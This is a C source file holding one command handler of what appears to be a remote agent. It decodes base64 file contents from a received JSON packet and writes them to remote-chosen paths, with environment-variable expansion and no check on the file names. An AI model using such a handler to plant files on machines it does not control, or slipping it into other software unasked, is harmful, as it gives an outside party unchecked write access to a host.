#include <stdint.h>
#include <stdio.h>
#include <memory.h>
#include <dirent.h>
#include "cJSON.h"
#include "agent_session.h"
#include "agent_protocol.h"
#include "agent_config.h"
#include "agent_utility.h"
#include "agent_filesystem.h"
#include "agent_commands.h"

command_result* cmd_upload_files(session* sess, packet* pck) {
	cJSON* jpayload = ZERO(cJSON);
	cJSON* jdestination = ZERO(cJSON);
	cJSON* jfiles = ZERO(cJSON);
	cJSON* jfile = ZERO(cJSON);
	cJSON* jfile_content = ZERO(cJSON);
	cJSON* jfile_path = ZERO(cJSON);	
	uint8_t* file_content = ZERO(uint8_t);
	char* file_path = ZERO(char);
	char* file_directory = ZERO(char);
	char expanded_file_path[4096] = { 0 };
	DECLARE_RESULT_WITH_FEEDBACK(cmd_result);

	jpayload = cJSON_Parse(pck->data);
	if (!jpayload) goto exit;

	jdestination = cJSON_GetObjectItem(jpayload, "destination");
	if (!jdestination) goto exit;

	jfiles = cJSON_GetObjectItem(jpayload, "files");
	if (!jfiles) goto exit;

	// write all received files to disk
	cJSON_ArrayForEach(jfile, jfiles) {
		jfile_content = cJSON_GetObjectItem(jfile, "content");
		jfile_path = cJSON_GetObjectItem(jfile, "name");
		if (!jfile_content || !jfile_path) goto exit;

		size_t content_size = 0;
		file_content = base64_decode(jfile_content->valuestring, &content_size);
		if (file_content) {
			// compose the file path
			size_t size = snprintf(0, 0, "%s%c%s", jdestination->valuestring, DIRECTORY_SEPARATOR, jfile_path->valuestring) + 1;
			file_path = MEM_ALLOC(size);
			if (!file_path) {
				cmd_result->error_code = ERROR_ALLOC_MEMORY;
				goto exit;
			}
			snprintf(file_path, size, "%s%c%s", jdestination->valuestring, DIRECTORY_SEPARATOR, jfile_path->valuestring);
			if (!expand_environment_variables(file_path, expanded_file_path, sizeof expanded_file_path)) goto exit;

			// create directory
			file_directory = get_directory(expanded_file_path);
			if (!rw_create_dir(file_directory)) {
				cmd_result->error_code = ERROR_DIRECTORY_ACCESS_ERROR;
				goto exit;
			}

			// write the file content
			FILE* hfile = fopen(expanded_file_path, "wb");
			if (hfile) {
				fwrite(file_content, sizeof(uint8_t), content_size, hfile);
				fclose(hfile);

				// free iteration resource
				FREE(file_path);
				FREE(file_directory);
				FREE(file_content);
				memset(expanded_file_path, 0, sizeof expanded_file_path);
			}
			else {
				cmd_result->error_code = ERROR_FILE_ACCESS_ERROR;
				goto exit;
			}
		}
	}

	SET_RESULT_SUCCESS(cmd_result);

exit:
	FREE(file_path);
	FREE(file_directory);
	FREE(file_content);
	if (jpayload) cJSON_Delete(jpayload);
	return cmd_result;
}